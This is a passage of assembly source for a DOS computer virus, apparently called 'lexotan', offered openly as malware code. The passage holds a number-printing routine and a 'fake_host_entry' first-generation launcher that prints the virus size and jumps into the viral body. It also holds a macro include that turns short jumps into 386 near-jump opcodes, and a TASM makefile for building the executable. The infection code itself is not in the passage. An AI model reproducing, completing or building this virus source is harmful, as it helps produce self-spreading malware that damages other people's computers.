       mov cx, 5
@@1:
       xor dx, dx
       div bp
       push ax
       mov al, dl
       add al, 30h
       stosb
       pop ax
       loop @@1
       cld
       ret

fake_host_entry:
       cld
       push es ds
       mov es, wo es:[2ch]
       mov ah, 49h
       int 21h
       push cs cs                              ;as any good 1st gen host, we
       pop es ds                               ;print useful info :P
       mov ax, ofs viralend
       call make_hex
       mov ax, ofs viralend
       call make_dec
       mov ah, 9h
       mov dx, ofs txt1
       int 21h
       pop ds es
       mov ax, cs
       mov ss, ax
       mov sp, ofs virusend+20h
       jmp virusstart

virusend:

end fake_host_entry

;(----------------------------------JMPS386.INC------------------------------)
; redefine commands: Jcc label         7x xx  ->  0F 8x xxxx
;                    JCXZ label        E3 xx  ->  OR CX, CX (OR ECX, ECX)
;                                                 JZ label
;                    LOOP label        E2 xx  ->  DEC CX
;                                                 JZ label
;                    LOOPD label    66 E2 xx  ->  DEC ECX
;                                                 JZ label
;                    JMP label         E9 xxxx -> CLC
;                                                 JNC label
;                                                 or
;                                                 STC
;                                                 JC  label
;                                                 or
;                                                 Jx  label
;                                                 JNx label
;                                                 or
;                                                 JNx label
;                                                 Jx  label

j_O             EQU     0000B
j_NO            EQU     0001B
j_B             EQU     0010B
j_NAE           EQU     j_B
j_NB            EQU     0011B
j_AE            EQU     j_NB
j_C             EQU     j_B
j_NC            EQU     j_NB
j_E             EQU     0100B
j_Z             EQU     j_E
j_NE            EQU     0101B
j_NZ            EQU     j_NE
j_BE            EQU     0110B
j_NA            EQU     j_BE
j_NBE           EQU     0111B
j_A             EQU     j_NBE
j_S             EQU     1000B
j_NS            EQU     1001B
j_P             EQU     1010B
j_PE            EQU     j_P
j_NP            EQU     1011B
j_PO            EQU     j_NP
j_L             EQU     1100B
j_NGE           EQU     j_L
j_NL            EQU     1101B
j_GE            EQU     j_NL
j_LE            EQU     1110B
j_NG            EQU     j_LE
j_NLE           EQU     1111B
j_G             EQU     j_NLE

jjj             macro   label, j_j
                db      0fh,80h + j_j
                dw      label-$-2
                endm

JO              macro   label
                jjj     label, j_O
                endm

JNO             macro   label
                jjj     label, j_NO
                endm

JB              macro   label
                jjj     label, j_B
                endm

JNAE            macro   label
                jjj     label, j_NAE
                endm

JNB             macro   label
                jjj     label, j_NB
                endm

JC              macro   label
                jjj     label, j_C
                endm

JNC             macro   label
                jjj     label, j_NC
                endm


JAE             macro   label
                jjj     label, j_AE
                endm

JE              macro   label
                jjj     label, j_E
                endm

JZ              macro   label
                jjj     label, j_Z
                endm

JNE             macro   label
                jjj     label, j_NE
                endm

JNZ             macro   label
                jjj     label, j_NZ
                endm

JBE             macro   label
                jjj     label, j_BE
                endm

JNA             macro   label
                jjj     label, j_NA
                endm

JNBE            macro   label
                jjj     label, j_NBE
                endm

JA              macro   label
                jjj     label, j_A
                endm

JS              macro   label
                jjj     label, j_S
                endm

JNS             macro   label
                jjj     label, j_NS
                endm

JP              macro   label
                jjj     label, j_P
                endm

JPE             macro   label
                jjj     label, j_PE
                endm

JNP             macro   label
                jjj     label, j_NP
                endm

JPO             macro     label
                jjj     label, j_PO
                endm

JL              macro   label
                jjj     label, j_L
                endm

JNGE            macro   label
                jjj     label, j_NGE
                endm

JNL             macro   label
                jjj     label, j_NL
                endm

JGE             macro   label
                jjj     label, j_GE
                endm

JLE             macro   label
                jjj     label, j_LE
                endm

JNG             macro   label
                jjj     label, j_NG
                endm

JNLE            macro   label
                jjj     label, j_NLE
                endm

JG              macro   label
                jjj      label, j_G
                endm

JMP             macro   label
                db      0e9h
                dw      label-$-2
                endm

;(----------------------------------MAKEFILE---------------------------------)
lexotan.exe : lexotan.obj
        link /LINE /CPARM:1 lexotan.obj,lexotan.exe,lexotan.map,,,
        tcref -r lexotan.xrf,lexotan.ref

lexotan.obj : lexotan.asm
        tasm /m /la /zi /z /w0 /mu /c lexotan.asm,lexotan.obj, \
              lexotan.lst,lexotan.xrf
